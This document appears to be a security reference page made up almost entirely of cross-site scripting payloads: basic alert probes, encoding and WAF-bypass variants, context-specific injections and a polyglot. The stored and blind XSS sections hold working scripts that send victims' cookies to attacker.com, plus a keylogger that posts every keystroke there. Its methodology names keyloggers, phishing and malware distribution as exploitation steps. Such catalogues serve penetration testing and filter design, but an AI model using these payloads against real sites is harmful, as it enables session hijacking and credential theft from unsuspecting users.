---
layout: vulnerability
title: Cross-Site Scripting (XSS)
description: Cross-site scripting payloads, WAF bypass techniques, and advanced XSS exploitation methods
severity: Medium
category: Web Application Vulnerabilities
owasp: A03:2021
permalink: /vulnerabilities/xss-payloads/
toc:
  - title: Overview
    anchor: overview
  - title: Reflected XSS
    anchor: reflected-xss
  - title: Stored XSS
    anchor: stored-xss
  - title: DOM-Based XSS
    anchor: dom-based-xss
  - title: WAF Bypass Payloads
    anchor: waf-bypass
  - title: Context-Aware Payloads
    anchor: context-aware
  - title: Advanced Techniques
    anchor: advanced-techniques
  - title: Testing Methodology
    anchor: testing-methodology
---

## Overview {#overview}

Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users, potentially leading to session hijacking, defacement, or malware distribution.

### Impact Assessment

- **Session Hijacking**: Steal user sessions and cookies
- **Defacement**: Modify website content
- **Malware Distribution**: Deliver malicious payloads
- **Phishing**: Create convincing phishing pages
- **Data Theft**: Extract sensitive information

### XSS Types

1. **Reflected XSS** - Scripts reflected from user input
2. **Stored XSS** - Scripts stored on the server
3. **DOM-Based XSS** - Scripts executed in the DOM
4. **Blind XSS** - Scripts executed in different contexts

## Reflected XSS {#reflected-xss}

Reflected XSS occurs when user input is immediately reflected in the response without proper sanitization.

### Basic Payloads

#### 1. Simple Alert
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

#### 2. Event Handlers
```javascript
<body onload=alert('XSS')>
<div onclick=alert('XSS')>Click me</div>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
```

#### 3. JavaScript Protocol
```javascript
<a href="javascript:alert('XSS')">Click me</a>
<iframe src="javascript:alert('XSS')">
<form action="javascript:alert('XSS')">
```

### Advanced Reflected XSS

#### 1. Encoded Payloads
```javascript
// HTML entities
&#60;script&#62;alert('XSS')&#60;/script&#62;

// URL encoding
%3Cscript%3Ealert('XSS')%3C/script%3E

// Unicode encoding
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

#### 2. Filter Bypass
```javascript
// Case variation
<ScRiPt>alert('XSS')</ScRiPt>

// Mixed case
<ScRiPt>alert('XSS')</ScRiPt>

// Alternative tags
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
```

## Stored XSS {#stored-xss}

Stored XSS occurs when malicious scripts are permanently stored on the server and executed when other users view the content.

### Persistent Payloads

#### 1. Comment Systems
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

#### 2. User Profiles
```javascript
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal.php?cookie='+document.cookie)">
```

#### 3. File Upload
```javascript
<script>alert('XSS')</script>
<iframe src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">
```

### Advanced Stored XSS

#### 1. Session Hijacking
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie);
xhr.send();
</script>
```

#### 2. Keylogger
```javascript
<script>
document.addEventListener('keydown', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/keylog.php');
    xhr.send('key=' + e.key);
});
</script>
```

## DOM-Based XSS {#dom-based-xss}

DOM-based XSS occurs when client-side JavaScript modifies the DOM in an unsafe way.

### Common Sources

#### 1. URL Parameters
```javascript
// Vulnerable code
document.getElementById('content').innerHTML = location.hash.substring(1);

// Exploit
#<script>alert('XSS')</script>
#<img src=x onerror=alert('XSS')>
```

#### 2. Document Referrer
```javascript
// Vulnerable code
document.write(document.referrer);

// Exploit
Referer: <script>alert('XSS')</script>
```

#### 3. Window Name
```javascript
// Vulnerable code
document.getElementById('content').innerHTML = window.name;

// Exploit
window.name = '<script>alert("XSS")</script>';
```

### Advanced DOM XSS

#### 1. Hash-based
```javascript
// Vulnerable code
eval(location.hash.substring(1));

// Exploit
#alert('XSS')
#document.location='http://attacker.com'
```

#### 2. Search-based
```javascript
// Vulnerable code
document.getElementById('search-results').innerHTML = 
    'Search results for: ' + location.search.substring(1);

// Exploit
?<script>alert('XSS')</script>
```

## WAF Bypass Payloads {#waf-bypass}

Web Application Firewalls can be bypassed using various techniques.

### Encoding Techniques

#### 1. HTML Entities
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```

#### 2. URL Encoding
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
%3Cimg%20src=x%20onerror=alert('XSS')%3E
```

#### 3. Unicode Encoding
```javascript
\u003cscript\u003ealert('XSS')\u003c/script\u003e
\u003cimg\u0020src=x\u0020onerror=alert('XSS')\u003e
```

### Filter Evasion

#### 1. Case Variation
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x ONERROR=alert('XSS')>
<SVG ONLOAD=alert('XSS')>
```

#### 2. Alternative Tags
```javascript
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
<iframe src="javascript:alert('XSS')">
<applet code="javascript:alert('XSS')">
```

#### 3. Event Handler Variation
```javascript
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img src=x onerror='alert("XSS")'>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

## Context-Aware Payloads {#context-aware}

Different contexts require different payload approaches.

### HTML Context

#### 1. Inside Tags
```javascript
<input value="<script>alert('XSS')</script>">
<textarea><script>alert('XSS')</script></textarea>
```

#### 2. Between Tags
```javascript
<div><script>alert('XSS')</script></div>
<p><script>alert('XSS')</script></p>
```

### JavaScript Context

#### 1. String Injection
```javascript
var user = "user"; alert('XSS'); //";
var user = 'user'; alert('XSS'); //';
```

#### 2. Function Injection
```javascript
function test(param) { alert('XSS'); }
test("user"); alert('XSS'); //");
```

### CSS Context

#### 1. Style Injection
```css
background: url("javascript:alert('XSS')");
background: url("data:text/javascript,alert('XSS')");
```

#### 2. Expression Injection
```css
background: expression(alert('XSS'));
background: -moz-binding: url("javascript:alert('XSS')");
```

## Advanced Techniques {#advanced-techniques}

### Polyglot Payloads

#### 1. Multi-Context Payload
```javascript
';alert('XSS');//
</script><script>alert('XSS')</script>
<!--<script>alert('XSS')</script>-->
```

#### 2. Universal Payload
```javascript
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

### Blind XSS

#### 1. Delayed Execution
```javascript
<script>
setTimeout(function() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie);
    xhr.send();
}, 5000);
</script>
```

#### 2. Conditional Execution
```javascript
<script>
if (document.location.hostname === 'target.com') {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + document.cookie);
    xhr.send();
}
</script>
```

## Testing Methodology {#testing-methodology}

### Phase 1: Reconnaissance
1. **Identify Input Points**
   - URL parameters
   - POST data
   - HTTP headers
   - Cookies
   - File uploads

2. **Test Basic Injection**
   - Simple script tags
   - Event handlers
   - JavaScript protocol

### Phase 2: Vulnerability Assessment
1. **Automated Scanning**
   - Burp Suite Scanner
   - OWASP ZAP
   - Custom XSS scanners

2. **Manual Testing**
   - Context analysis
   - Filter testing
   - WAF bypass

### Phase 3: Exploitation
1. **Proof of Concept**
   - Simple alert boxes
   - Cookie theft
   - Session hijacking

2. **Advanced Exploitation**
   - Keyloggers
   - Phishing pages
   - Malware distribution

---

## References & Further Reading

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input](https://cwe.mitre.org/data/definitions/79.html)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)